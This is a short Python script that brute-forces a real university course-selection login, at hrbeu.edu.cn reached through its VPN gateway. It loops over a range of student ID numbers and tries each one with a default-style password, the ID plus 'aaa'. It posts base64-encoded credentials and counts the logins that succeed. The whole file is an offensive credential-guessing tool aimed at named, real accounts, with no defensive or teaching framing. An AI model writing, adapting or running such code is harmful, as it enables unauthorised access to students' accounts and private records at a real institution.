import base64, requests, re
import OutNetLink

fo = open("list.txt", "wb+")
cnt = 0
for i in range(2015201101, 2015202131):
    s = OutNetLink.getConn()
    url = 'https://ssl.hrbeu.edu.cn/web/1/http/1/edus' \
          'ys.hrbeu.edu.cn/jsxsd/xk/LoginToXk'
    zh = str(i).encode(encoding="utf-8")
    psw = str(str(i) + 'aaa').encode(encoding="utf-8")
    arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
    arg = arg.decode()
    # print(arg, type(arg))
    data = {
        'encoded': arg
    }
    cur = s.post(url=url, data=data)
    print(cur.text)
    fi = re.search(u'用户名或密码错误', cur.text)
    # print(fi)
    if fi is None:
        cnt = cnt + 1

print(cnt)
